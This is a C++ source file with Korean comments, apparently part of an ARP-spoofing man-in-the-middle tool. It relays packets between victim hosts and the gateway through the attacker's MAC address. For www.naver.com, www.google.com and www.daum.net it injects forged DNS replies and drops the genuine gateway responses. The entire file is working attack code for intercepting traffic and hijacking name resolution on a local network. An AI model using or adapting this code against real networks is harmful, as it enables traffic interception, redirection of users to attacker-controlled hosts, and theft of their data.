#include "packet_forwarder.hpp"
#include "dns_spoof.hpp"
#include <iostream>
#include <unistd.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <net/ethernet.h>
#include <arpa/inet.h>
#include <string.h>

using namespace std;

#define DNS_PORT 53

PacketForwarder::PacketForwarder(pcap_t* handle, const ArpSpoofer* spoofer)
    : handle(handle), spoofer(spoofer), running(false) {}

PacketForwarder::~PacketForwarder() {
    stop();
}

void PacketForwarder::start() {
    if (running)
        return;
    running = true;
    forward_thread = make_unique<thread>(&PacketForwarder::forward_loop, this);
}

void PacketForwarder::stop() {
    running = false;
    cv.notify_all();
    if (forward_thread && forward_thread->joinable())
        forward_thread->join();
}

void PacketForwarder::forward_loop() {
    cout << "패킷 포워딩 시작됨.\n";
    struct pcap_pkthdr* header;
    const u_int8_t* packet_data;
    int res;
    while (running) {
        res = pcap_next_ex(handle, &header, &packet_data);
        if (res == 0)
            continue;
        else if (res < 0) {
            cerr << "패킷 캡처 오류: " << pcap_geterr(handle) << "\n";
            break;
        }
        struct ether_header* eth = (struct ether_header*)packet_data;
        if (ntohs(eth->ether_type) == ETHERTYPE_ARP) {
            // ARP 패킷은 여기서 처리하지 않음
        } else if (ntohs(eth->ether_type) == ETHERTYPE_IP) {
            if (is_spoofed_packet(packet_data, header->len))
                forward_packet(packet_data, header->len);
        }
    }
    cout << "패킷 포워딩 중지됨.\n";
}

bool PacketForwarder::is_spoofed_packet(const u_int8_t* packet_data, size_t packet_len) {
    if (packet_len < sizeof(struct ether_header) + sizeof(struct ip_header))
        return false;
    struct ether_header* eth = (struct ether_header*)packet_data;
    if (ntohs(eth->ether_type) != ETHERTYPE_IP)
        return false;
    struct ip_header* ip = (struct ip_header*)(packet_data + sizeof(struct ether_header));
    u_int8_t src_ip[4], dst_ip[4];
    memcpy(src_ip, &ip->ip_src, 4);
    memcpy(dst_ip, &ip->ip_dst, 4);

    bool src_is_target = false, dst_is_target = false;
    bool src_is_gateway = ip_equals(src_ip, spoofer->get_gateway_ip());
    bool dst_is_gateway = ip_equals(dst_ip, spoofer->get_gateway_ip());
    for (const auto& target : spoofer->get_targets()) {
        if (ip_equals(src_ip, target->get_ip()))
            src_is_target = true;
        if (ip_equals(dst_ip, target->get_ip()))
            dst_is_target = true;
    }
    return (src_is_target && dst_is_gateway) || (src_is_gateway && dst_is_target);
}

void PacketForwarder::forward_packet(const u_int8_t* packet_data, size_t packet_len) {
    u_int8_t* new_packet = new u_int8_t[packet_len];
    memcpy(new_packet, packet_data, packet_len);
    struct ether_header* eth = (struct ether_header*)new_packet;
    struct ip_header* ip = (struct ip_header*)(new_packet + sizeof(struct ether_header));
    u_int8_t src_ip[4], dst_ip[4];
    memcpy(src_ip, &ip->ip_src, 4);
    memcpy(dst_ip, &ip->ip_dst, 4);

    // MAC 주소 설정
    if (ip_equals(src_ip, spoofer->get_gateway_ip())) {
        memcpy(eth->ether_shost, spoofer->get_attacker_mac(), 6);
        bool found = false;
        for (const auto& target : spoofer->get_targets()) {
            if (ip_equals(dst_ip, target->get_ip())) {
                memcpy(eth->ether_dhost, target->get_mac(), 6);
                found = true;
                break;
            }
        }
        if (!found) {
            delete[] new_packet;
            return;
        }
    } else {
        memcpy(eth->ether_shost, spoofer->get_attacker_mac(), 6);
        memcpy(eth->ether_dhost, spoofer->get_gateway_mac(), 6);
    }

    // DNS 포트 검사
    if (ip->ip_p == IPPROTO_UDP) {
        int ip_header_len = (ip->ip_vhl & 0x0f) * 4;
        if (packet_len >= sizeof(struct ether_header) + ip_header_len + sizeof(udp_header)) {
            udp_header* udp = (udp_header*)(new_packet + sizeof(struct ether_header) + ip_header_len);
            u_int16_t sport = ntohs(udp->uh_sport);
            u_int16_t dport = ntohs(udp->uh_dport);

            // DNS 요청
            if (dport == DNS_PORT && !ip_equals(src_ip, spoofer->get_gateway_ip())) {
                uint8_t* dns_ptr = (uint8_t*)(new_packet + sizeof(struct ether_header) + ip_header_len + sizeof(udp_header));
                size_t dns_len = packet_len - (sizeof(struct ether_header) + ip_header_len + sizeof(udp_header));
                std::string domain = extract_domain_name(dns_ptr, dns_len);
                for (auto &c : domain) c = tolower(c);
                if (!domain.empty() && domain.back() == '.')
                    domain.pop_back();

                bool should_spoof = (domain == "www.naver.com" || domain == "www.google.com" || domain == "www.daum.net");

                if (should_spoof) {
                    cout << "스푸핑 대상 도메인: " << domain << endl;
                    send_dns_spoof_response(handle, new_packet, packet_len,
                        spoofer->get_attacker_mac(), spoofer->get_gateway_ip(),
                        domain, spoofer->get_targets());
                    

                    // 원본도 전달 (실제 응답 무시용)
                    if (pcap_sendpacket(handle, new_packet, packet_len) != 0)
                        cerr << "DNS 쿼리 패킷 포워딩 실패: " << pcap_geterr(handle) << "\n";
                    delete[] new_packet;
                    return;
                }
            }
            // DNS 응답 (서버 → 클라이언트)
            else if (sport == DNS_PORT && ip_equals(src_ip, spoofer->get_gateway_ip())) {
                uint8_t* dns_ptr = (uint8_t*)(new_packet + sizeof(struct ether_header) + ip_header_len + sizeof(udp_header));
                size_t dns_len = packet_len - (sizeof(struct ether_header) + ip_header_len + sizeof(udp_header));

                if (dns_len >= 3 && (dns_ptr[2] & 0x80)) {
                    std::string domain = extract_domain_name(dns_ptr, dns_len);
                    for (auto &c : domain) c = tolower(c);
                    if (!domain.empty() && domain.back() == '.')
                        domain.pop_back();

                    if (domain == "www.naver.com" || domain == "www.google.com" || domain == "www.daum.net") {
                        cout << "게이트웨이 DNS 응답 (" << domain << ") DROP." << endl;
                        delete[] new_packet;
                        return;
                    }
                }
            }
        }
    }

    // 일반 포워딩
    if (mac_equals(eth->ether_dhost, ZERO_MAC)) {
        cout << "목적지 MAC 주소가 설정되지 않았습니다. 패킷을 전달하지 않습니다." << endl;
    } else {
        if (pcap_sendpacket(handle, new_packet, packet_len) != 0)
            cerr << "패킷 포워딩 실패: " << pcap_geterr(handle) << "\n";
    }

    delete[] new_packet;
}
